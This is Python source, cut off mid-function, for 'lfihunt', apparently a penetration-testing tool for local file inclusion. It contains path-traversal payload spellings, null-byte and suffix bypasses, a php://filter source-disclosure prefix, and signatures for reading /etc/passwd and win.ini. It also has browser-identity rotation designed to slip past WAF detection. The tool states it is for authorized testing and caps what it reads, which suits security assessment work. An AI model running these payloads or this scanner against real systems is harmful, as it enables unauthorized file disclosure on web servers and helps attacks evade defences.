#!/usr/bin/env python3
"""
lfihunt — Local File Inclusion testing.

Three phases:
  1. DETECT     find parameters whose value reaches a filesystem read
  2. EXPLOIT    establish how far out of the web root the read can go, and
                which traversal spelling the filter fails to stop
  3. EXFIL      pull a capped proof-of-read, and nothing more

Detection is signature-based, never reflection-based. The single biggest source
of false LFI reports is an application that echoes the payload back: a response
containing "../../../etc/passwd" proves the string was reflected, not that a
file was read. Every candidate here must produce STRUCTURE that the payload did
not contain -- a real passwd line matched by regex, a real win.ini section
header, a base64 blob that decodes to source code -- and must survive a
comparison against both a benign baseline and a nonexistent-file control.

Payloads are split by target OS. Sending C:\\Windows\\win.ini to a Linux box is
wasted requests and noise in someone's WAF log, so the families are gated
independently (--no-windows / --no-linux).

On confirmation this reads a capped proof and stops: the first few lines of
/etc/passwd or win.ini. It does not walk the filesystem, does not chase
/etc/shadow, and does not harvest application secrets. Proving the read is the
finding; hoovering up the data is someone else's job description.

For authorized testing only.
"""

from __future__ import annotations

import argparse
import base64
import concurrent.futures
import os
import random
import re
import sys
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from urllib.parse import (urlsplit, urlunsplit, parse_qsl, urlencode, quote)

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    sys.exit("[!] pip install requests")

# A real browser version string is complete: "Chrome/126.0" is not a version
# any browser has ever sent, and WAFs match that shape directly - the request
# is refused before the payload is looked at.
#
# Five mainstream identities, each carrying the headers that browser actually
# sends. They are whole profiles rather than a list of User-Agent strings
# because the rest of the request has to agree with the name on it: only
# Chromium sends sec-ch-ua, Firefox and Safari send none at all, and each has
# its own Accept. A Firefox User-Agent arriving with Chrome's client hints is a
# louder signal than no rotation at all. Same table as xsshunt.py.
CHROME_ACCEPT = ("text/html,application/xhtml+xml,application/xml;q=0.9,"
                 "image/avif,image/webp,image/apng,*/*;q=0.8,"
                 "application/signed-exchange;v=b3;q=0.7")
FIREFOX_ACCEPT = ("text/html,application/xhtml+xml,application/xml;q=0.9,"
                  "image/avif,image/webp,*/*;q=0.8")
SAFARI_ACCEPT = ("text/html,application/xhtml+xml,application/xml;q=0.9,"
                 "*/*;q=0.8")


def _chromium_hints(major: str, platform: str, edge: str = "") -> dict:
    brands = (f'"Chromium";v="{major}", "Microsoft Edge";v="{major}", '
              f'"Not?A_Brand";v="24"' if edge else
              f'"Chromium";v="{major}", "Google Chrome";v="{major}", '
              f'"Not?A_Brand";v="24"')
    return {"sec-ch-ua": brands, "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": f'"{platform}"'}


UA_PROFILES = [
    {"name": "Chrome 141 / Windows",
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                   "AppleWebKit/537.36 (KHTML, like Gecko) "
                   "Chrome/141.0.7390.66 Safari/537.36",
     "Accept": CHROME_ACCEPT, "Accept-Language": "en-US,en;q=0.9",
     "hints": _chromium_hints("141", "Windows")},
    {"name": "Chrome 141 / macOS",
     "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
                   "AppleWebKit/537.36 (KHTML, like Gecko) "
                   "Chrome/141.0.7390.66 Safari/537.36",
     "Accept": CHROME_ACCEPT, "Accept-Language": "en-US,en;q=0.9",
     "hints": _chromium_hints("141", "macOS")},
    {"name": "Edge 141 / Windows",
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                   "AppleWebKit/537.36 (KHTML, like Gecko) "
                   "Chrome/141.0.7390.66 Safari/537.36 Edg/141.0.3537.57",
     "Accept": CHROME_ACCEPT, "Accept-Language": "en-US,en;q=0.9",
     "hints": _chromium_hints("141", "Windows", edge="1")},
    {"name": "Firefox 143 / Windows",
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) "
                   "Gecko/20100101 Firefox/143.0",
     "Accept": FIREFOX_ACCEPT, "Accept-Language": "en-US,en;q=0.5",
     "hints": {}},          # Gecko sends no client hints
    {"name": "Safari 18 / macOS",
     "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
                   "AppleWebKit/605.1.15 (KHTML, like Gecko) "
                   "Version/18.6 Safari/605.1.15",
     "Accept": SAFARI_ACCEPT, "Accept-Language": "en-US,en;q=0.9",
     "hints": {}},          # WebKit sends no client hints
]

DEFAULT_UA = UA_PROFILES[0]["User-Agent"]
UA = DEFAULT_UA             # kept for anything still reading it

# Sent by every one of the five on a navigation, http and https alike. Their
# absence is a tell in itself, so a request claiming to be a browser carries
# them whichever profile is in use.
FETCH_METADATA = {
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1",
}

CRIT, HIGH, MED, LOW, INFO = "CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"

# ----------------------------------------------------------------------------
# payloads
# ----------------------------------------------------------------------------

# Target files, per OS. Each carries the regex that proves a real read.
# The regex must match structure the payload itself never contains.
# Target files, per OS. Each carries the regex that proves a real read.
# The regex must match structure the payload itself never contains.
#
# None of them is anchored to the start of a line, and that is deliberate.
# Anchoring assumes the file arrives verbatim, but an LFI almost always renders
# INTO a page: bWAPP runs the content through nl2br(), so every line of
# /etc/passwd arrives as "<br />root:*:0:0:...". Measured against a faithful
# replica, the previous "^..." + re.M signatures matched nothing at all on such
# a target - 0 findings in 1159 requests against a file that was demonstrably
# being read. What replaces the anchor is a guard on the preceding character,
# so the match still cannot start mid-word, plus a structural requirement the
# payload cannot fake: the home directory field has to look like a path.
TARGETS_LINUX = [
    {"file": "etc/passwd",
     # Just the root line, nothing else. Parsing the full seven-field structure
     # was overkill: it bought no safety, because a payload is a path and can
     # never contain "root:x:0:0:" by accident, and every extra field was one
     # more thing to be wrong about - negative UIDs on macOS, an empty GECOS, a
     # shell field cut off by the page. One unmistakable string is enough.
     #
     # The password field stays open rather than pinned to '*': macOS writes
     # '*' but Linux writes 'x', and hardcoding either one would make the tool
     # blind on half the targets it is pointed at.
     "re": re.compile(r"root:[^:\n<>]{0,32}:0:0:"),
     "label": "/etc/passwd"},
    # {"file": "etc/hosts",
    #  "re": re.compile(r"(?:^|[^\d.])(?:127\.0\.0\.1|::1)[ \t]+[A-Za-z0-9_.\-]+",
    #                   re.M),
    #  "label": "/etc/hosts"},
    # {"file": "proc/self/environ",
    #  # environ is NUL-separated, but a page that renders it may turn those into
    #  # spaces or tags; '=/' keeps the match specific either way.
    #  "re": re.compile(r"(?:^|\x00|[>\s])(?:PATH|HOSTNAME|SHELL|PWD|HOME|USER)=/",
    #                   re.M),
    #  "label": "/proc/self/environ"},
    # {"file": "etc/issue",
    #  "re": re.compile(r"(?i)\b(ubuntu|debian|centos|red hat|alpine|fedora)\b"),
    #  "label": "/etc/issue"},
    # # macOS has neither /proc nor /etc/issue, which left /etc/passwd and
    # # /etc/hosts as the only candidates on a Mac - both of them anchored, both
    # # of them blind to a page that renders the file. This one is world-readable
    # # and its structure is unmistakable.
    # {"file": "System/Library/CoreServices/SystemVersion.plist",
    #  "re": re.compile(r"(?i)<key>\s*Product(?:Name|BuildVersion|UserVisibleVersion)"
    #                   r"\s*</key>"),
    #  "label": "/System/Library/CoreServices/SystemVersion.plist (macOS)"},
]

TARGETS_WINDOWS = [
    {"file": "Windows/win.ini",
     "re": re.compile(r"(?i)\[(?:fonts|extensions|mci extensions|files)\]"),
     "label": "C:\\Windows\\win.ini"},
    {"file": "Windows/System32/drivers/etc/hosts",
     "re": re.compile(r"(?i)(?:^|[^\d.])(?:127\.0\.0\.1|::1)[ \t]+\S+"
                      r"|#\s*Copyright.*Microsoft", re.M),
     "label": "C:\\Windows\\System32\\drivers\\etc\\hosts"},
    {"file": "boot.ini",
     "re": re.compile(r"(?i)\[boot loader\]"),
     "label": "C:\\boot.ini"},
    {"file": "Windows/win.ini",
     "re": re.compile(r"(?i)\[(?:fonts|extensions)\]"),
     "label": "C:\\Windows\\win.ini (drive walk)", "drives": True},
]

# Headers worth injecting into. An LFI sink fed by a header is rarer than one
# fed by a query parameter, but it is also the one a URL-only scan can never
# reach: think include($_SERVER['HTTP_X_LANG'] . ".php"). Same list as the
# other tools in the suite.
INJECTABLE_HEADERS = ["User-Agent", "Referer", "X-Forwarded-For",
                      "X-Forwarded-Host", "X-Real-IP", "Origin",
                      "X-Requested-With", "X-Api-Version", "True-Client-IP",
                      "Client-IP", "X-Wap-Profile", "From"]


# Traversal spellings.
SPELLINGS = [
    ("plain",             "../"),
    ("backslash",         "..\\"),
    ("url-encoded",       "%2e%2e%2f"),
    ("url-encoded-back",  "%2e%2e%5c"),
    ("slash-encoded",     "..%2f"),
    ("double-encoded",    "%252e%252e%252f"),
    ("nested-stripped",   "....//"),
    ("nested-stripped-b", "..../\\"),
    ("utf8-overlong",     "..%c0%af"),
    ("utf8-overlong-2",   "%c0%ae%c0%ae/"),
]

# In a QUERY VALUE plain "../" reaches the application intact, so it leads and
# the report names the simplest working form. In a PATH SEGMENT it usually does
# not: Apache, nginx and most proxies collapse dot segments during request
# normalisation, before the application is reached. Encoded spellings survive
# that, so path mode leads with them -- testing "../" first in a path mostly
# measures the proxy, not the app.
_PATH_ORDER = ["url-encoded", "slash-encoded", "double-encoded",
               "url-encoded-back", "nested-stripped", "utf8-overlong",
               "utf8-overlong-2", "plain", "backslash", "nested-stripped-b"]


# The root separator each spelling would use with no traversal in front of it.
# A file read needs no "../" when the application hands the value straight to
# open(): "/etc/passwd" IS the payload. It is also the only thing that works on
# an application that rejects "..", which is a whole family of targets --
# measured on a replica that blocks traversal and accepts an absolute path,
# the traversal-only sweep returned 0 findings in 2887 requests against a file
# the endpoint was demonstrably serving.
ROOT_SEP = {
    "plain": "/",              "backslash": "\\",
    "url-encoded": "%2f",      "url-encoded-back": "%5c",
    "slash-encoded": "%2f",    "double-encoded": "%252f",
    "nested-stripped": "/",    "nested-stripped-b": "/",
    "utf8-overlong": "%c0%af", "utf8-overlong-2": "/",
}


# An application can validate that the filename STARTS WITH the directory it
# serves from. Neither a bare absolute path nor a bare traversal passes that
# check: the payload has to carry the expected prefix and then climb out of it,
# /var/www/images/../../../etc/passwd. One climb depth covers every base,
# because ".." at the root is a no-op on both Linux and Windows -- measured:
# /var/www/images/ + eight "../" reads the same file as the exact three.
PREFIX_CLIMB = 8

# Every prefix this tool uses is one the TARGET produced. There is no list of
# conventional web roots here on purpose: a guessed /var/www/html/ that happens
# to work reads exactly like a discovered one in a report, and a guessed one
# that does not is pure request budget. Everything below is a way of noticing
# that something the application itself handed us looks like a path.
PREFIX_CLIMB = 8

# Path-shaped strings, wherever they turn up: a parameter value, a sibling
# parameter, a stack trace, a "No such file" naming the path it tried.
_ABS_DIR_RX = re.compile(r"(?:^|[\s\"'>(\[=:])((?:/[A-Za-z0-9_.\-]{1,64}){2,})")
_WIN_DIR_RX = re.compile(r"([A-Za-z]:\\(?:[A-Za-z0-9_.\-]{1,64}\\?){1,8})")
_NOT_PATHY = re.compile(r"\s|://")


def looks_like_path(value: str) -> bool:
    """A value with a directory component, and nothing that says 'URL'."""
    if not value or len(value) > 200 or _NOT_PATHY.search(value):
        return False
    i = max(value.rfind("/"), value.rfind("\\"))
    return 0 < i < len(value) - 1


def dir_of(value: str) -> str:
    """The directory part, separator kept, or '' when there is none."""
    i = max(value.rfind("/"), value.rfind("\\"))
    return value[:i + 1] if i > 0 else ""


# An application can check that the filename ENDS WITH an extension it serves,
# and then hand the value to a file API that stops at the first NUL. The
# payload has to satisfy both: ../../../etc/passwd%00.png. A bare %00 does not
# -- measured on a replica, %00 alone is refused and %00.png reads the file.
# The extension worth appending is not one of a thousand guesses: it is the one
# the endpoint was already being called with.
_EXT_RX = re.compile(r"\.([A-Za-z0-9]{1,5})$")


def ext_of(value: str) -> str:
    """'.jpg' from 'images/73.jpg', or '' when the value carries none."""
    tail = value.rsplit("/", 1)[-1].rsplit("\\", 1)[-1]
    m = _EXT_RX.search(tail)
    return "." + m.group(1) if m else ""


def parse_cookie_header(value: str) -> dict:
    """Split a Cookie header into its individual cookies, order preserved."""
    jar = {}
    for part in (value or "").split(";"):
        part = part.strip()
        if not part or "=" not in part:
            continue
        k, _, v = part.partition("=")
        if k.strip():
            jar[k.strip()] = v.strip()
    return jar


def build_cookie_header(jar: dict) -> str:
    return "; ".join(f"{k}={v}" for k, v in jar.items())


# A name alone is ambiguous once cookies and headers are injection points too:
# "file" can be a query parameter, a body field and a cookie on the same
# request, and picking by name only would test whichever came first. The prefix
# says which one is meant; without it the name still matches anywhere, so the
# short form keeps working.
PARAM_KINDS = {
    "query": "param", "get": "param", "url": "param",
    "body": "body", "post": "body", "data": "body",
    "cookie": "cookie",
    "header": "header",
}


@dataclass(frozen=True)
class ParamSpec:
    """One name given to -p, with the place it has to be looked for."""
    kind: str                   # "" = anywhere | param | body | cookie | header
    name: str                   # as the user spelled it

    @property
    def key(self) -> str:
        return self.name.lower()

    def matches(self, point) -> bool:
        loc = point[1] if point[0] != "path" else ""
        if str(loc).lower() != self.key:
            return False
        return not self.kind or point[0] == self.kind

    def __str__(self) -> str:
        return f"{self.kind}:{self.name}" if self.kind else self.name


def parse_param_specs(raw: str) -> list:
    """Parse -p: "file,cookie:lang,header:X-Api-Version"."""
    out = []
    for item in (raw or "").split(","):
        item = item.strip()
        if not item:
            continue
        kind = ""
        head, sep, tail = item.partition(":")
        if sep and tail.strip():
            k = PARAM_KINDS.get(head.strip().lower())
            if k:
                kind, item = k, tail.strip()
        out.append(ParamSpec(kind, item))
    return out


def spellings_for(mode: str) -> list[tuple[str, str]]:
    if mode != "path":
        return list(SPELLINGS)
    rank = {n: i for i, n in enumerate(_PATH_ORDER)}
    return sorted(SPELLINGS, key=lambda s: rank.get(s[0], 99))


# Segments that are identifiers rather than route names. Collapsing them lets
# /product/123/detail and /product/456/detail be recognised as one template.
_SEG_NUMERIC = re.compile(r"^\d+$")
_SEG_UUID = re.compile(
    r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$", re.I)
_SEG_HEX = re.compile(r"^[0-9a-f]{16,}$", re.I)
_SEG_DATE = re.compile(r"^\d{4}-\d{2}-\d{2}$")


def normalise_path(path: str) -> str:
    """
    Collapse a URL path to its template, so near-identical URLs share a key.
    Identifier-looking segments become placeholders; everything else is
    lowercased. Extensions are kept: /a.php and /a.jsp are different apps.
    """
    out = []
    for s in path.split("/"):
        if not s:
            continue
        if _SEG_NUMERIC.match(s):
            out.append("{n}")
        elif _SEG_UUID.match(s):
            out.append("{uuid}")
        elif _SEG_DATE.match(s):
            out.append("{date}")
        elif _SEG_HEX.match(s):
            out.append("{hex}")
        else:
            out.append(s.lower())
    return "/" + "/".join(out)

# Suffix defeats: the app may append an extension to the value.
SUFFIX_TRICKS = [
    ("none",        ""),
    ("null-byte",   "%00"),
    ("question",    "?"),
    ("hash",        "#"),
    ("semicolon",   ";"),
]

VERSION = "1.7.0"

MAX_DEPTH = 8            # ../ repetitions
EXFIL_MAX_BYTES = 1024   # hard cap on proof-of-read
EXFIL_MAX_LINES = 12

# PHP source disclosure. Reading the app's own source is the highest-value
# LFI outcome after RCE, so it is tested -- but capped like everything else.
PHP_FILTER = "php://filter/convert.base64-encode/resource="

# Advertising parameters never reach a filesystem read. Skipping them keeps the
# request budget on parameters that might actually be vulnerable.
NOISE_PARAMS = {"gclid", "gbraid", "wbraid", "gad_source", "msclkid", "fbclid",
                "dclid", "cto_pld", "awc", "mc_cid", "mc_eid", "igshid",
                "utm_source", "utm_medium", "utm_campaign", "utm_term",
                "utm_content", "_ga", "_gl", "yclid", "ttclid", "epik"}


# ----------------------------------------------------------------------------
# colour
# ----------------------------------------------------------------------------

ANSI = {
    CRIT: "\033[1;95m", HIGH: "\033[1;91m", MED: "\033[1;93m",
    LOW: "\033[1;96m", INFO: "\033[0;37m",
    "ok": "\033[1;92m", "warn": "\033[0;93m", "bad": "\033[0;91m",
    "dim": "\033[0;90m", "b": "\033[1m", "head": "\033[1;36m", "x": "\033[0m",
}
_COLOR = True


def set_color(enabled):
    global _COLOR
    _COLOR = enabled


def paint(s, key):
    return s if not _COLOR else f"{ANSI.get(key, '')}{s}{ANSI['x']}"


def status_key(code):
    try:
        code = int(code)
    except (TypeError, ValueError):
        return "dim"
    if 200 <= code < 300:
        return "ok"
    if code in (401, 403):
        return "warn"
    if 500 <= code < 600:
        return "bad"
    return "dim"


# ----------------------------------------------------------------------------
# status
# ----------------------------------------------------------------------------

class Status:
    """
    Periodic heartbeat for list mode (-l), on a timer from a daemon thread so
    it fires at a steady wall-clock interval regardless of verbosity and of how
    long any one host takes. Whole lines, not an in-place redraw: at -v 1 the
    output scrolls continuously and an in-place indicator would be unreadable.
    """

    def __init__(self, console, total, interval=30.0, enabled=True):
        self.con = console
        self.total = total
        self.interval = interval
        self.enabled = enabled
        self.done = 0
        self.tests = 0
        self.counts = {CRIT: 0, HIGH: 0, MED: 0, LOW: 0, INFO: 0}
        self._lk = threading.Lock()
        self._stop = threading.Event()
        self._thread = None
        self._t0 = 0.0

    def start(self):
        if not self.enabled:
            return
        self._t0 = time.time()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def _loop(self):
        # wait() returns True only when stop() is set, so a normal timeout emits
        while not self._stop.wait(self.interval):
            self.emit()

    def host_done(self, n=1):
        with self._lk:
            self.done += n

    def test_done(self, n=1):
        with self._lk:
            self.tests += n

    def record(self, sev):
        with self._lk:
            if sev in self.counts:
                self.counts[sev] += 1

    def emit(self, label="status"):
        if not self.enabled:
            return
        with self._lk:
            done, tests, c = self.done, self.tests, dict(self.counts)
        remaining = max(0, self.total - done)
        el = int(time.time() - self._t0)
        self.con.line(paint(
            f"  [{label} {el // 60:02d}:{el % 60:02d}]  "
            f"tested {done}/{self.total}  remaining {remaining}  "
            f"payloads {tests}  |  "
            f"crit {c[CRIT]}  high {c[HIGH]}  med {c[MED]}  "
            f"low {c[LOW]}  info {c[INFO]}", "head"))

    def stop(self):
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=1)


# ----------------------------------------------------------------------------
# console
# ----------------------------------------------------------------------------

class Console:
    def __init__(self, verbosity=0):
        self.v = verbosity
        self._lk = threading.Lock()

    def line(self, s=""):
        with self._lk:
            print(s, flush=True)

    def banner(self, s):
        if self.v >= 1:
            self.line("\n" + paint(f"=== {s} ===", "head"))

    def info(self, s):
        if self.v >= 1:
            self.line(paint(f"    {s}", "dim"))

    def debug(self, s):
        if self.v >= 2:
            self.line(paint(f"    {s}", "dim"))

    def auth(self, s):
        """Always shown — a scan that silently runs unauthenticated looks
        exactly like one that found nothing."""
        self.line(paint(f"[auth] {s}", "head"))

    def skip(self, s):
        if self.v >= 1:
            self.line(paint(f"  [skip] {s}", "dim"))

    def error(self, s):
        self.line(paint(f"  [err] {s}", "bad"))

    def test(self, host, what, code, note=""):
        """Every probe, at -v 1. This is the 'display all tests' mode."""
        if self.v < 1:
            return
        self.line(f"  {paint('·', 'dim')}  {host}  {what:<44} "
                  f"{paint(str(code), status_key(code)):<14} {paint(note, 'dim')}")

    def finding(self, f):
        """Confirmed findings only -- printed at every verbosity, including 0."""
        self.line("")
        self.line(f"  {paint('[' + f.sev + ']', f.sev)} {paint(f.title, 'b')}")
        self.line(f"    URL       : {f.url}")
        self.line(f"    Parameter : {f.param}")
        if f.evidence:
            for ln in f.evidence.split("\n"):
                self.line(f"    Evidence  : {ln}")
        if f.proof:
            self.line(f"    {paint('--- proof of read (capped) ---', 'b')}")
            for ln in f.proof.split("\n"):
                self.line(f"      {paint(ln, 'ok')}")
        if f.curl:
            self.line(f"    PoC       : {paint(f.curl, 'warn')}")
        self.line("")


# ----------------------------------------------------------------------------
# model
# ----------------------------------------------------------------------------

@dataclass
class Finding:
    title: str
    url: str
    param: str
    sev: str = HIGH
    evidence: str = ""
    proof: str = ""
    curl: str = ""
    when: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())


@dataclass
class Resp:
    status: int
    body: str
    headers: dict = field(default_factory=dict)
    error: str = ""

    @property
    def ok(self):
        return not self.error

    def header(self, name, default=""):
        for k, v in self.headers.items():
            if k.lower() == name.lower():
                return v
        return default


# ----------------------------------------------------------------------------
# http
# ----------------------------------------------------------------------------

class AuthStore:
    """
    Per-host authentication headers, loaded once and consulted per request.

    Most of an application's surface sits behind a login, and until now the
    only way in was -H, which feeds ONE header dict shared by every target: in
    -l mode a session cookie given that way is sent to every host in the list,
    including third parties. Here the headers are keyed by (host, port) and
    resolved at request time, so they reach the host they belong to and no
    other.

    Files are named after the host they authenticate:

        www.example.com.txt        every port of that host
        www.example.com_8080.txt   that port only, and it wins over the above

    No implicit subdomain inheritance: a file for example.com does NOT
    authenticate app.example.com. Credentials that follow a wildcard end up on
    whatever subdomain happens to resolve, including one that has been taken
    over -- which is the sort of thing this suite exists to find.

    Content is the -H syntax, one header per line; '#' and blank lines are
    ignored and a line without a colon is reported rather than dropped in
    silence. Nothing here is limited to Cookie and Authorization: an Origin, an
    X-Api-Key or a tenant header belongs just as well.
    """

    def __init__(self):
        self.forced: dict = {}          # --auth-file: applies to every target
        self.by_key: dict = {}          # (host, port|None) -> headers
        self.loaded: list = []          # (path, scope) for the -v 1 listing

    # -- loading

    @staticmethod
    def _parse(path: str, con) -> dict:
        out = {}
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            for n, line in enumerate(fh, 1):
                line = line.strip().lstrip("﻿")
                if not line or line.startswith("#"):
                    continue
                if ":" not in line:
                    con.info(f"{os.path.basename(path)}:{n}: no ':' — line "
                             f"ignored: {line[:60]}")
                    continue
                k, _, v = line.partition(":")
                if k.strip():
                    out[k.strip()] = v.strip()
        return out

    @staticmethod
    def _key_from_name(name: str):
        """www.example.com_8080.txt -> ('www.example.com', 8080)."""
        stem = name[:-4] if name.lower().endswith(".txt") else name
        host, sep, tail = stem.rpartition("_")
        if sep and host and tail.isdigit():
            return host.lower(), int(tail)
        return stem.lower(), None

    @classmethod
    def load(cls, auth_file, auth_dir, con):
        st = cls()
        if auth_file:
            if not os.path.isfile(auth_file):
                raise ValueError(f"no such auth file: {auth_file}")
            st.forced = cls._parse(auth_file, con)
            st.loaded.append((auth_file, "every target"))
        elif auth_dir:
            if not os.path.isdir(auth_dir):
                raise ValueError(f"no such auth directory: {auth_dir}")
            for name in sorted(os.listdir(auth_dir)):
                if name.startswith(".") or not name.lower().endswith(".txt"):
                    continue
                path = os.path.join(auth_dir, name)
                if not os.path.isfile(path):
                    continue
                host, port = cls._key_from_name(name)
                st.by_key[(host, port)] = cls._parse(path, con)
                st.loaded.append(
                    (path, host if port is None else f"{host}:{port}"))
        return st

    def __bool__(self):
        return bool(self.forced or self.by_key)

    def describe(self, con):
        if not self.loaded:
            return
        con.auth(f"{len(self.loaded)} auth file(s) loaded")
        for path, scope in self.loaded:
            con.info(f"  auth {os.path.basename(path)} -> {scope}")

    # -- resolution

    @staticmethod
    def _key(url: str):
        parts = urlsplit(url)
        host = (parts.hostname or "").lower()
        port = parts.port or (443 if parts.scheme == "https" else 80)
        return host, port

    def headers_for(self, url: str) -> dict:
        """The auth headers this URL gets, port-specific file winning."""
        if self.forced:
            return self.forced
        host, port = self._key(url)
        return (self.by_key.get((host, port))
                or self.by_key.get((host, None)) or {})

    def names_for(self, url: str) -> set:
        return {k.lower() for k in self.headers_for(url)}

    def cookies_for(self, url: str) -> set:
        """Cookie names supplied as credentials — never injected by default."""
        out = set()
        for k, v in self.headers_for(url).items():
            if k.lower() == "cookie":
                out |= set(parse_cookie_header(v))
        return out


class Http:
    @staticmethod
    def _as_dict(headers) -> dict:
        out = {}
        for h in headers or []:
            if ":" in h:
                k, _, v = h.partition(":")
                if k.strip():
                    out[k.strip()] = v.strip()
        return out

    def __init__(self, console, timeout=20.0, delay=0.0, proxy=None,
                 extra_headers=None, verify=False, req_headers=None, auth=None):
        self.con = console
        self.timeout = timeout
        self.verify = verify
        self.auth = auth
        self.proxies = {"http": proxy, "https": proxy} if proxy else None
        # Sources, lowest priority first: what the captured request carried,
        # what the auth file says for this host, then -H.
        self.learned: dict = {}
        self.req_headers = self._as_dict(req_headers)
        self.cli_headers = self._as_dict(extra_headers)
        self.base_headers = dict(FETCH_METADATA)
        self.base_headers.update(self._profile_headers(UA_PROFILES[0]))
        self.base_headers.update(self.req_headers)
        self.base_headers.update(self.cli_headers)
        self._explicit = {k.lower() for k in self.cli_headers}

        # Identity rotates per TARGET HOST, never per request: one client that
        # changes browser between two requests of the same session is a louder
        # signal than any single fixed User-Agent, and its cookies would follow
        # it across the change. Each host sees one coherent browser; the next
        # host sees a different one. The starting point is random so two runs
        # over the same list do not line up.
        self._profiles = list(UA_PROFILES)
        self._rotation = random.randrange(len(self._profiles))
        self._by_host: dict = {}
        self._host_lk = threading.Lock()

        self._min_gap = max(0.0, delay)
        self._next = 0.0
        self._rate_lk = threading.Lock()
        self._cnt_lk = threading.Lock()
        self._local = threading.local()
        self.count = 0

    def _session(self):
        s = getattr(self._local, "s", None)
        if s is None:
            s = requests.Session()
            self._local.s = s
        return s

    def _throttle(self):
        if self._min_gap <= 0:
            return
        with self._rate_lk:
            now = time.monotonic()
            wait = max(0.0, self._next - now)
            self._next = max(now, self._next) + self._min_gap
        if wait:
            time.sleep(wait)

    @staticmethod
    def _profile_headers(profile: dict) -> dict:
        return {k: v for k, v in profile.items() if k not in ("name", "hints")}

    def profile_for(self, url: str) -> dict:
        """The browser identity this host is being scanned as."""
        host = (urlsplit(url).netloc or url).lower()
        with self._host_lk:
            prof = self._by_host.get(host)
            if prof is None:
                prof = self._profiles[self._rotation % len(self._profiles)]
                self._rotation += 1
                self._by_host[host] = prof
            return prof

    def headers_for(self, url: str) -> dict:
        """
        Every header this URL gets, resolved here rather than stored.

        A per-host table has to be CONSULTED per request, not written into a
        shared dict when a host starts: -l runs several hosts in parallel
        threads, and a mutation would hand one host another's session
        intermittently -- the very leak the table exists to prevent.

        Order, lowest first: defaults, the captured request, the browser
        profile, the auth file, -H. Cookie is the exception: it is merged
        cookie by cookie along that same order, so a TrackingId carried by a
        -r capture survives a session= supplied by an auth file instead of
        being replaced wholesale by it.
        """
        auth = self.auth.headers_for(url) if self.auth else {}
        pinned = self._explicit | {k.lower() for k in auth}

        out = dict(FETCH_METADATA)
        out.update(self.learned)
        out.update(self.req_headers)

        profile = self.profile_for(url)
        prof = dict(self._profile_headers(profile))
        # Client hints go only to secure contexts, and only for the engines
        # that have them: putting Chromium's hints on a plain-http request, or
        # on a Firefox identity, is as anomalous as leaving them out of an
        # https one.
        if url.lower().startswith("https://"):
            prof.update(profile.get("hints") or {})
        for k, v in prof.items():
            if k.lower() not in pinned:
                out[k] = v

        out.update(auth)
        out.update(self.cli_headers)

        jar = {}
        for src in (self.learned, self.req_headers, auth, self.cli_headers):
            for k, v in src.items():
                if k.lower() == "cookie":
                    jar.update(parse_cookie_header(v))
        if jar:
            for k in [k for k in out if k.lower() == "cookie"]:
                del out[k]
            out["Cookie"] = build_cookie_header(jar)
        return out

    def header_for(self, url: str, name: str) -> str:
        """The value this URL currently carries for one header."""
        want = name.lower()
        return next((v for k, v in self.headers_for(url).items()
                     if k.lower() == want), "")

    def send(self, method, url, data=None, headers=None) -> Resp:
        self._throttle()
        with self._cnt_lk:
            self.count += 1
        h = self.headers_for(url)
        if headers:
            h.update(headers)
        # A raw string body carries traversal payloads that must reach the wire
        # byte-for-byte; requests re-encodes only a dict body, so form data is
        # pre-serialised by the caller and passed as a str. Make sure a content
        # type is set when we send one.
        if isinstance(data, str) and not any(k.lower() == "content-type" for k in h):
            h["Content-Type"] = "application/x-www-form-urlencoded"
        if any(k.lower() == "cookie" for k in h):
            # requests rebuilds the Cookie header from its own jar and
            # OVERWRITES the one we set, so a Set-Cookie picked up along the
            # way would silently replace the cookie under test.
            self._session().cookies.clear()
        try:
            # The literal query must survive: requests re-encodes percent
            # sequences while preparing, which would collapse %252e back to
            # %2e and silently destroy the double-encoding payloads. The same
            # applies to a raw-string body (POST param injection).
            parts = urlsplit(url)
            safe = urlunsplit((parts.scheme, parts.netloc, "/", "", ""))
            req = requests.Request(method, safe, headers=h, data=data).prepare()
            req.url = url
            r = self._session().send(req, timeout=self.timeout,
                                     verify=self.verify, proxies=self.proxies,
                                     allow_redirects=False)
            return Resp(r.status_code, r.text[:300000], dict(r.headers))
        except requests.RequestException as e:
            return Resp(0, "", {}, error=str(e))

    def get(self, url, headers=None) -> Resp:
        return self.send("GET", url, None, headers)


# ----------------------------------------------------------------------------
# scanner
# ----------------------------------------------------------------------------

class LfiHunter:
    # A value that is almost certainly not a real file, used as the control.
    CONTROL = "lfihunt-no-such-file-4d9a1c"

    def __init__(self, http: Http, con: Console, args, status: Status = None):
        self.http = http
        self.con = con
        self.args = args
        self.status = status
        self.findings: list[Finding] = []
        self.skipped: list[dict] = []
        self._seen: set[tuple[str, str]] = set()
        self.deduped = 0
        self._lk = threading.Lock()
        self._poc_cookie = ""      # cookie replayed in curl PoC (mode -r)
        self._prefix_cache: dict = {}   # discovered path prefixes, per point
        self._body_params: dict = {}    # -r body, so -p body:NAME can add one

    def add(self, f: Finding):
        with self._lk:
            self.findings.append(f)
        if self.status:
            self.status.record(f.sev)
        self.con.finding(f)

    def _probe(self):
        if self.status:
            self.status.test_done()

    # ---- target selection

    def target_sets(self):
        """
        [(os_label, [targets])] for the families enabled on the command line.

        --no-windows and --no-linux gate this and nothing else consults the
        flags, so a disabled family cannot leak back in through another path.
        """
        sets = []
        if not self.args.no_linux:
            sets.append(("linux", TARGETS_LINUX))
